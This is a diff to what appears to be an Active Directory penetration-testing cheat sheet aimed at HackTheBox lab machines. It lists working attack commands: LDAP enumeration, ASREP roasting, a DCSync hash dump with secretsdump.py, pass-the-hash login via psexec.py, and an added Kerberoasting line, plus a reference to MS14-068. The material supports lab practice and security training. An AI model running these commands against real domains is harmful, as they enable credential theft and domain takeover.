@@ -123,8 +123,9 @@ ldapsearch -H ldap://[IP_ADDR] -x -b "dc=[DC],dc=[DC]"
 ldapsearch -H ldap://[IP_ADDR] -x -b '' -s base
 windapsearch.py -d [DOMAIN] --dc-ip [IP_ADDR] -U    # -U to enumerate all AD users; -G for AD group enumerate
 GetNPUsers.py htb.local/ -dc-ip 10.10.10.161 -request 		# ASRep Roasting
-secretdumps.py htb.local/svc_user@10.10.10.161 -just-dc 	# dcsync attack, dump hashes
+secretsdump.py htb.local/svc_user@10.10.10.161 -just-dc 	# dcsync attack, dump hashes
 psexec.py htb.local/administrator@10.10.10.161 -hashes [ntlm:hash]	# login with hashes
+GetUserSPNs.py active.htb/[USER]:[PASSWORD] -dc-ip [IP_ADDR] -request
 
 ----------Info----------
 MS14-068 (For DC older than Windows Server 2012 R2)		# Ref: https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html
